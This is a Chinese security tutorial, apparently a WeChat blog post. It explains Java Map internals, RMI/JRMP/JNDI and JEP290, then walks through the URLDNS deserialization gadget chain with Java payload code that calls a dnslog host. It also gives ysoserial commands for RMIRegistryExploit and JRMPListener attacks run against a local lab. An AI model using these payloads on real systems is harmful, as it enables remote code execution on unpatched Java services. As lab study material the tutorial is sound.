我们可以利用集合存放数据, 也可对集合进行新增、删除、修改、查看等操作  
集合中数据都是在内存中, 当程序关闭或重启后集合中数据会丢失 . 所以集合是一种**临时**存储数据的容器  

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmfP2IXDPbqbu4nRyq627I1cZH1bLVaZ3hE8m9fwnricgSficYaAsBG0Mg/640?wx_fmt=png)image.png

### Map 集合类型

1.  1. Map
    

*   • Map 集合是一个双列集合, 一个元素包含两个值 (一个 key, 一个 value)
    
*   • Map 集合中的元素, key 和 value 的数据类型可以相同, 也可以不同
    
*   • Map 集合中的元素, key 是不允许重复的, value 是可以重复的
    
*   • Map 集合中的元素, key 和 value 是一一对应的
    

*   • 特点
    

4.  2. HashMap
    

*   • 采用 Hashtable 哈希表存储结构 (神奇的结构)
    
*   • 优点: 添加速度快、查询速度快、删除速度快
    
*   • 缺点: key 无序
    

6.  3. LinkedHashMap
    

*   • 采用哈希表存储结构, 同时使用链表维护次序
    
*   • key 有序 (添加顺序)
    

8.  4. TreeMap
    

*   • 采用二叉树 (红黑树) 的存储结构
    
*   • 优点: key 有序 查询速度比 List 快 (按照内容查询)
    
*   • 缺点: 查询速度没有 HashMap 快
    

### Map 接口

1.  1. 接口 Map 是独立的接口, 和 Collection 没有关系 Map 中每个元素都是 Entry 类型, 每个元素都包含 Key(键) 和 Value(值)
    

1.  1. 继承关系 Ctrl+H
    

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmsz7wwLXicON81Ribkrfp8KNBqTjvTMDvEXYnUvCurDZzvyKV6ZBHd9OQ/640?wx_fmt=png)image.png

```
  2. 包含的APIAlt+7

```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmOCOAtHF8JqrmFaMgy5ydOQJQQTrTb93LAuDGialFKgRwf3qT0ia52kKQ/640?wx_fmt=png)image.png

### Map 使用

```
/*
* @Author: 
* @Date: 2022-10-16 20:33:43
* @LastEditors: 
* @LastEditTime: 2022-10-16 22:34:09
* @Description: 请填写简介
*/
package java_Map;

import java.util.*;

public class TestMap {
    public static void main(String[] args) {
        //        Student stu1 = new Student(1, "张三", 22);
        //        Student stu2 = new Student(2, "李四", 28);
        //        Student stu3 = new Student(3, "王五", 24);
        //        Student stu4 = new Student(4, "赵六", 21);
        //        Student stu5 = new Student(5, "刘琦", 18);
        //
        //        Map<Integer, Student> map = new HashMap<>();
        //        map.put(stu1.getId(), stu1);
        //        map.put(stu2.getId(), stu2);
        //        map.put(stu3.getId(), stu3);
        //        map.put(stu4.getId(), stu4);
        //        map.put(stu5.getId(), stu5);
        //        // 该代码允许用户从System.in读取一个数字
        //        Scanner sc = new Scanner(System.in);
        //        // 提示文字
        //        System.out.println("请输入学生的编号:");
        //        // 该代码允许用户从System.in读取一个数字
        //        int id = sc.nextInt();
        //        sc.close();
        //        // map.get()通过key取值
        //        System.out.println(map.get(id));

        Map<Integer, String> map = new HashMap<>();
        // Map集合添加元素 k v
        map.put(1, "北京");
        map.put(2, "山东");
        map.put(3, "河南");
        map.put(4, "河北");
        // 根据Key获取对应的值
        System.out.println(map.get(1));
        // 根据Map的key进行元素的移除 如果元素不存在返回是null 否则返回移除对象的value
        String s = map.remove(1);
        System.out.println(s);
        // 根据 k v 同时移除内容  返回值是布尔类型
        System.out.println(map.remove(2, "山东"));

        // 元素的替换
        System.out.println(map.replace(3, "天津"));
        // 替换成功返回Bool
        System.out.println(map.replace(4, "河北", "山西"));
        System.out.println(map.get(4));

        System.out.println(map);
        // 清空map集合内容 k   v 都清空
        map.clear();
        System.out.println(map);

        System.out.println("--------HashMap保存值情况--------");
        map.put(1, "北京1");
        // HashMap中如果k相同了 后者的v就会把前者相同的k的v进行覆盖
        System.out.println(map);
        // hash表中是允许Kev保存空对象
        map.put(null, "空");
        System.out.println(map);
        System.out.println("--------TreeMap保存值情况--------");
        Map<Integer, String> map2 = new TreeMap<>();
        map2.put(1, "北京");
        map2.put(2, "北京2");
        // TreeMap中如果k相同了 后者的v就会把前者相同的k的v进行覆盖
        map2.put(1, "北京3");
        // Tree中不允许Kev保存空值,否则出错(源码中没有对null进行处理)
        // map2.put(null, "空");
        System.out.println(map2);
        System.out.println("--------Map3集合的遍历--------");
        Map<Integer, String> map3 = new HashMap<>();
        map3.put(1, "北京");
        map3.put(2, "山东");
        map3.put(3, "河南");
        map3.put(4, "河北");
        // 当前遍历的方式
        // 获得map集合中当前所有的key
        System.out.println("遍历方法一:");
        Set<Integer> keySet = map3.keySet();
        for (Integer key : keySet) {
            System.out.println(key+"----"+map3.get(key));
        }
        // 直接获得map集合的value
        System.out.println("遍历方法二:");
        Collection<String> values = map3.values();
            for (String value : values) {
            System.out.println(value);
            }

            System.out.println("遍历方法三:");
            Set<Map.Entry<Integer, String>> entrySet= map3.entrySet();
            for (Map.Entry<Integer, String> entry : entrySet) {
            System.out.println(entry.getKey()+"----"+entry.getValue());
            }
            }
            }

```

### Entry 键值对对象

我们已经知道，Map 中存放的是两种对象，一种称为 key(键)，一种称为 value(值)，它们在 Map 中是一对应关系，这一对对象又称做 Map 中的一个 Entry(项)。Entry 将键值对的对应关系封装成了对象。即键值对对象，这样我们在遍历 Map 集合时，就可以从每一个键值对 ( Entry ) 对象中获取对应的键与对应的值既然 Entry 表示了一对键和值, 那么也同样提供了获取对应键和对应值得方法:

*   • public K getKey(): 获取 Entry 对象中的键
    
*   • public V getValue(): 获取 Entry 对象中的值
    

在 Map 集合中也提供了获取所有 Entry 对象的方法:

*   • public Set<Map.Entry<K,V>> entrySet(): 获取到 Map 集合中所有的键值对对象的集合 (Set 集合)
    

设定值

*   • setValue(V value)
    
*   • 用指定的值替换与该条目对应的值（可选操作）（写入映射。）如果映射已经从映射中删除（通过迭代器的删除操作），则此调用的行为是未定义的。
    
*   • 参数: value- 要存储在此条目中的新值
    
*   • return: 对应条目的旧值
    

前置知识
----

### 利用链

> 利用链是什么：
> 
> *   • **入口点 Source + 中间经过的类方法 gadget + 执行点 Sink**
>     

### RMI/JRMP/JNDI

#### RMI(Remote Method Invocation)

> 能够让程序员开发出基于 Java 的分布式应用. 一个 RMI 对象是一个远程 Java 对象, 可以从另一个 Java 虚拟机上 (甚至跨过网络) 调用他的方法, 可以像调用本地 Java 对象的方法一样调用远程对象的方法, 使分布在不同的 JVM 中的对象的外表和行为都像本地对象一样
> 
> **一台机器想要执行另一台机器上的 java 代码**
> 
> 例如:
> 
>  ``我们使用浏览器对一个http协议实现的接口进行调用,这个接口调用过程我们可以称为`Interface Invocation`,而RMI的概念与之非常相似,只不过RMI调用的是一个Java方法,而浏览器调用的是一个http接口.并且Java中封装了RMI的一系列定义``

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xm9hb2LZAZibKOooickH6v7t1LPjp0DoHhlJxOia0wwEcsr8ZvY5TdibUQyQ/640?wx_fmt=png)

  
Server---> 告诉注册中心  
Client---> 根据名字和注册中心要端口

> Registry 翻译一下就是注册处, 其实本质就是一个 map(hashtable), 注册着许多 Name 到对象的绑定关系, 用于客户端查询要调用的方法的引用.
> 
> **注册中心约定端口: 1099**
> 
> Registry 的作用就好像是病人 (**客户端**) 看病之前的挂号 (**获取远程对象的 IP、端口、标识符**), 知道医生 (**服务端**) 在哪个门诊, 再去看病 (**执行远程方法**)

RMI 底层通讯采用了 Stub(**运行在客户端**) 和 Skeleton(**运行在服务端**) 机制, RMI 调用远程的方法大致如下:  
**整个过程会进行两次 TCP 连接:**

1.  1. Client 获取这个 Name 和对象的绑定关系
    

*   • RMI 客户端在调用远程方法时会先创建`Stub(sun.rmi.registry.Registrylmpl Stub)`
    
*   • Stub 会将 Remote 对象传递给远程引用层`java.rmi.server.RemoteRef`并创建  
    `java.rmi.server.RemoteCall`(远程调用) 对象。
    
*   • RemoteCall 序列化 RMI 服务名称、Remote 对象。
    
*   • RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。
    
*   • RMI 服务端的远程引用层`sun.rmi.server.UnicastServerRef`收到请求会请求传递给`Skeleton(sun.rmi.registry.Registrylmpl_Skel#dispatch)`
    
*   • Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。
    
*   • Skeleton 处理客户端请求: bind、 list、 lookup、 rebind、 unbind, 如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。
    

3.  2. 再去连接 Server 并调用远程方法
    

*   • RMI 客户端反序列化服务端结果, 获取远程对象的引用
    
*   • RMI 客户端调用远程方法, RMI 服务端反射调用 RMI 服务实现类的对应方法并序列化执行结果返回给客户端
    
*   • RMI 客户端反序列化 RMI 远程方法调用结果
    

** 危险的点:** 如果服务端没有我想调用的对象 ->RMI 允许服务端从远程服务器进行远程 URL 动态类加载  
对象调用: 从网络通信到内存操作, 有一个对象的创建到调用的过程 --> 在 JAVA 中使用序列化和反序列化来实现

#### JRMP(Remote Method Protocol)

> 通俗点解释: 它就是一个协议, 一个在 TCP/IP 之上的线路层协议, 一个 RMI 的过程, 是用到 JRMP 这个协议去组织数据格式然后通过 TCP 进行传输, 从而达到 RMI, 也就是远程方法调用、

#### JNDI(Naming and Directory Interface)

> Java 命名和目录接口, 既然是接口, 那必定就有实现, 而目前我们 Java 中使用最多的基本就是 RMI 和 LDAP 的目录服务系统.
> 
> 而命名的意思就是，在一个目录系统，它实现了把一个服务名称和对象或命名引用相关联，在客户端，我们可以调用目录系统服务，并根据服务名称查询到相关联的对象或命名引用，然后返回给客户端。而目录的意思就是在命名的基础上，增加了属性的概念，我们可以想象一个文件目录中，每个文件和目录都会存在着一些属性，比如创建时间、读写执行权限等等，并且我们可以通过这些相关属性筛选出相应的文件和目录。而 JNDI 中的目录服务中的属性大概也与之相似，因此，我们就能在使用服务名称以外，通过一些关联属性查找到对应的对象
> 
> 总结的来说：JNDI 是一个接口，在这个接口下会有多种目录系统服务的实现，我们能通过名称等去找到相关的对象，并把它下载到客户端中来。

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmbHXdCulyjonaibjRjGVo1hv02Pzlqxjn1mP1Qr5hkqG6pFrUPxzTibzQ/640?wx_fmt=png)

还是前面所说的例子, 我们在使用浏览器进行访问一个网络上的接口时, 它和服务器之间的数据传输以及数据格式的组织, 使用到基于 TCP/IP 之上的 HTTP 协议, 只有通过 HTTP 协议, 浏览器和服务端约定好的一个协议, 他们之间才能正常的交流通讯, 而 JRMP 也是一个与之相似的协议, 只能 JRMP 这个协议仅用于 Java RMI 中

### JJEP(JAVA Enhancement proposa)

> JEP290 是 Java 为了防御反序列化攻击而设置的一种过滤器, 其在 JEP 项目中编号为 290, 因而通常被简称为 JEP290

1.  1. 黑白名单结合对反序列化的类进行检测, 需要注意的是因为 UnicastRef 类在白名单内, JRMP 客户端的 payload 可以用来连恶意的服务端
    
2.  2. 检测反序列化链的深度
    
3.  3. 在 RMI 过程中提供了调用对象提供了一个验证类的机制
    
4.  4. 过滤内容可被配置
    

JEP290 需要手动设置, 只有设置了之后才会有过滤, 没有设置的话还是可以正常的反序列化漏洞利用  
JEP290 默认只为 RMI 注册表 (RMI Register 层)、RMI 分布式垃圾收集器(DGC 层) 以及 JMX 提供了相应的内置过滤器  
Bypass JEP290 的关键在于: 通过反序列化将 Registry 变为 JRMP 客户端, 向 JRMPListener 发起 JRMP 请求.(8u121-8u240)  
二次反序列化思维导图:  

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmpHHYGSygg0nVLM92AFmjL4y1DRhdZz7P9DDxnZV1rMzPicyvXxib5G9Q/640?wx_fmt=png)

URLDNS 链
--------

> URLDNS 链是 java 原生态的一条利用链, 通常用于存在反序列化漏洞进行验证的, 因为是原生态, 不存在什么版本限制.  
> HashMap 结合 URL 触发 DNS 检查的思路. 在实际过程中可以首先通过这个去判断服务器是否使用了 readObject() 以及能否执行. 之后再用各种 gadget 去尝试 RCE.  
> HashMap 最早出现在 JDK 1.2 中, 底层基于散列算法实现. 而正是因为在 HashMap 中, Entry 的存放位置是根据 Key 的 Hash 值来计算, 然后存放到数组中的. 所以对于同一个 Key, 在不同的 JVM 实现中计算得出的 Hash 值可能是不同的. 因此, HashMap 实现了自己的 writeObject 和 readObject 方法.

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmia0vynQRzrSIOKbHIM3yuRghHR9Jic7ETbocw0FQGLwYpaic7ib8KUxdRA/640?wx_fmt=png)

### HashMap

对于`HashMap`这个类来说, 他重载了`readObject`函数, 在重载的逻辑中, 我们可以看到他重新计算了`key`的`Hash`  

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmyibYVDG9dBol6FKh0Oz7MHKXgbnklL6nRYLCZVKlseXG0lZjM7Usic2g/640?wx_fmt=png)

跟进`hash`函数, 我们可以看到, 它调用了`key`的`hashcode`函数, 因此, 如果要构造一条反序列化链条, 我们需要找到实现了`hashcode`函数且传参可控, 并且可被我们利用的类, 那么可以被我们利用的类就是下面的`URLDNS`  

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmuK2Ry4EoZPNXWibcfpliabtvds2JyS0P3Jcw1oXib1RVKN36HAUHBdzPw/640?wx_fmt=png)

### URLDNS

找到`URLStreamHandler`这个抽象类, 查看它的`hashcode`实现, 调用了`getHostAddress`函数, 传参可控  

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmbWFybMIWeOFkve2ra4cRsZWeFcN0gU32KKV1ibPZJiaQ7rqdH2As0SyA/640?wx_fmt=png)

查看`getHostAddress`函数, 可以发现它进行了 DNS 查询, 将域名转换为实际的 IP 地址  

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmlDobujVtTElJBfWNCjfARUia1Wl3LMV0ibiaROBOzVOmgqiaDdMPiaF7O6g/640?wx_fmt=png)

```
/*
 * @Author: 
 * @Date: 2022-10-03 19:11:15
 * @LastEditors: 
 * @LastEditTime: 2022-10-05 10:25:36
 * @Description: 请填写简介
 */

package serializable.urldns;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;


public class Dnstest {
    public static void main(String[] args) throws Exception {
        HashMap<URL, Integer> hashmap = new HashMap<URL, Integer>();
        URL url = new URL("http://v0qf5g.dnslog.cn");
        Class c =URL.class;
        Field fieldHashcode = c.getDeclaredField("hashCode");
        fieldHashcode.setAccessible(true);
        // 发现在生成过程中,dnslog就收到了请求,并且在反序列过程后dnslog不在收到新的请求,这显然不符合我们的期望
        // 原因是在put的过程中hashMap类就调用了hash方法,并且在hash方法中判断hashcode不为初始化的值(-1)时会直接返回,在序列化的时候已经进行了hashCode计算,那么在反序列化时就不会走到他真正的handler.hashCode方法里
        // 所以需要修改hashCode值不为-1
        fieldHashcode.set(url,1);
        hashmap.put(url, 22);
        // 反序列化之后还是需要让他发送请求,所以需要改回来
        // 通俗讲如果不修改上方的hashCode值,还未反序列化就会造成一次DNSLOG请求,所以需要禁止put请求,让反序列化时的readObject去请求
        fieldHashcode.set(url,-1);
        Serializable(hashmap);
    }

    public static void Serializable(Object obj) throws Exception {
        ObjectOutputStream InputStream = new ObjectOutputStream(new FileOutputStream("ser.txt"));
        InputStream.writeObject(obj);
        InputStream.close();
    }
}

```

### 总结

1.  1. 首先找到 Sink: 发起 DNS 请求的 URL 类 hashCode 方法
    
2.  2. 看谁能调用 URL 类的 hashCode 方法 (找 gadget), 发现 HashMap 行 (他重写了 hashCode 方法, 执行了 Map 里面 key 的 hashCode 方法, HashMap 而 key 的类型可以是 URL 类), 而且 **HashMap 的 readObject 方法直接调用了 hashCode 方法**
    
3.  3. EXP 的思路就是创建一个 HashMap, 往里面丢一个 URL 当 key, 然后序列化它
    
4.  4. 在反序列化的时候自然就会执行 HashMap 的 readObject->hashCode->URL 的 hashCode->DNS 请求
    

ysoserial 使用
------------

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 calc.exe > ser.bin
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit YOUR-IP 1099 CommonsCollections1 calc.exe

```

1.  1. 下载源码包, 使用 idea 编译, 项目地址: https://github.com/frohoff/ysoserial
    
2.  2. 使用 idea 打开源码包
    
3.  3. 设置 maven 为国内源
    

1.  1. 点击 maven-> 点击扳手 -> 点击 maven Settings->User settings file-> 勾选 Override  
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmQX7chKyn6GqQxpAbDb07Sr5LyPRGHdic9EXLZYgaPdG5LMFCnqX1PFw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmeiaTqKuPJ4jicxooMfEsodWiciaicqEmRU5pSXbj1p3TPf2ibpofjOIbk3QQ/640?wx_fmt=png)
2.  ![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmRg5WyN3MNp6xTvDOd0HC5YtXQonFLuTFnjAMulvvvAwib4ez4FRtUKQ/640?wx_fmt=png)

5.  4. settings.xml 内容为:
    

```
 <?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/SETTINGS/1.0.0"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd">
    <mirrors>
        <!-- 阿里云仓库 -->
        <mirror>
            <id>alimaven</id>
            <mirrorOf>central</mirrorOf>
            <name>aliyun maven</name>
            <url>http://maven.aliyun.com/nexus/content/repositories/central/</url>
        </mirror>


        <!-- 中央仓库1 -->
        <mirror>
            <id>repo1</id>
            <mirrorOf>central</mirrorOf>
            <name>Human Readable Name for this Mirror.</name>
            <url>http://repo1.maven.org/maven2/</url>
        </mirror>


        <!-- 中央仓库2 -->
        <mirror>
            <id>repo2</id>
            <mirrorOf>central</mirrorOf>
            <name>Human Readable Name for this Mirror.</name>
            <url>http://repo2.maven.org/maven2/</url>
        </mirror>
    </mirrors> 

</settings>

```

1.  1. 点击 apply->OK
    
2.  2. 点击刷新按钮, 等待下载依赖
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xm9B1nKXql1TLkaCicsQEmxLtNbsj6LPkOrJSpTQhXx95eY4YccbV4Eibw/640?wx_fmt=png)
3.  3. 点击小锤子, 构建项目，如果出现报错:`java: 程序包sun.rmi.server不存在`和`java: 程序包sun.rmi.transport不存在`可以不用管
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmkloiaibyUVlOyvhXIJXEbHpnDmxrmDpM64crmmcIUcy5bMMDEHInYDKQ/640?wx_fmt=png)
4.  4. 编译项目点击 M 命令行输入:`mvn clean package -DskipTests`
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmE4j5sGZ89GY9R8uIibBS11KKuYohJicfVNiaWEiaRHkRoM8nEWLWZzZEgQ/640?wx_fmt=png)
5.  5. 编译完成
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmhvC3tTicU5mSqrvVjkHg02icknTZosQVZq7JYjG5vP6iblM3UXribafEeQ/640?wx_fmt=png)

环境: https://security-1258894728.cos.ap-beijing.myqcloud.com/TOP10/UnSerializable/java/JavaDeserializationTest.zip

### URLDNS 利用

1.  1. 打开前面写的`Dnstest.java`将代码中的 dnslog 换为自己的, 然后序列化恶意数据
    
2.  2. 反序列化恶意数据, 然后 dnslog 中会显示请求内容
    

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmet8OYhoUMOibpa6lwCpt1ic6Fr7VpPn5eYUf8shq8VJ0zYMIA5gsa4EA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmcmSJ8WHfdHBfVnSUcBHias5W6ry63xTiaBffnvBgfIic1K3LBC5nUaULw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmVQBkQhPPLyZRyUOE28U430guaxl3GOibUk3Zn4hibSxLHt3LkEx39sCg/640?wx_fmt=png)

### RMIRegistryExploit 利用

1.  1. 打开环境中的`RMIServer.java`右键运行
    
2.  2. 使用 ysoserial 攻击
    

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections1 "calc"

```

### JRMPClient 利用

1.  1. 打开环境中的`RMIServer.java`右键运行
    
2.  2. 使用`ysoserial`攻击
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmNYcuF4a3ZqPJxcE3q2Vapevia4d4VQYd0oORU3vQBaLibT0cGaX9NCcA/640?wx_fmt=png)

### JRMPListener 利用

*   • 生成反序列化数据
    

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient 127.0.0.1:6666 > jrmp.bin

```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmCG0Cwjm64scgsJajNNnjhbAjfr9SUHib0sib5MxsKibDcAJVYMHgtQJFw/640?wx_fmt=png)

*   • 启动 JRMP
    

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections6 "calc"

```

*   • 反序列化
    

```
package com.chaitin;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class Unserialization {
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception{
        unserialize("jrmp.bin");
    }
}

```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubiaLIhIpmoIhswjHv88L1xmgh4JBbfdkeor8NrbWF7tzuxNs0GWzjw2jlia8v4XdCFWs3LTIdibBWWQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0x3kGZxwKTkyY7BrNkUwicjIkq3F2xlCIgGz7pBpnEMh3rvpbyH2DE2kIKVste0B2yP8TiavoOsuo9sMQKSj9uxQ/640?wx_fmt=png)

技术交流

  

  

知识星球

  

  

**致力于红蓝对抗，实战攻防，星球不定时更新内外网攻防渗透技巧，以及最新学习研究成果等。常态化更新最新安全动态。专题更新奇技淫巧小 Tips 及实战案例。  
**

**涉及方向包括 Web 渗透、免杀绕过、内网攻防、代码审计、应急响应、云安全。星球中已发布 200+ 安全资源，针对网络安全成员的普遍水平，并为星友提供了教程、工具、POC&EXP 以及各种学习笔记等等。**

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYmNKGiac5jzvbTTnwhGXXI8mTRm3Hd4PqNKiaZqbxC4rDiaVvxllH9ic3ibV5YJZYX15mTEw0libLS3AsA/640?wx_fmt=png)

交流群

  

  

关注公众号回复 “**加群**”，添加 Z2OBot 小 K 自动拉你加入 **Z2O 安全攻防交流群**分享更多好东西。

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYMO5aHRB3TbIy3xezlTAkbFzqIRfZNnicxSC23h1UmemDu9Jq38xrleA6NyoWBu1nAj0nmE6YXEHg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubEBT4bUSeGS6micuPMlUoN1vd7kGCw2KeNFhicuQunVRDXhWHtDbp7tVRTL5lxPibjePvPrTVa3RjlQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

关注我们

  

  

**关注福利：**  

**回复 “****app****" 获取  app 渗透和 app 抓包教程**

**回复 “****渗透字典** **" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。**

**回复 “****书籍** **" 获取 网络安全相关经典书籍电子版 pdf**

****回复 “资料** **" 获取 网络安全、渗透测试相关资料文档****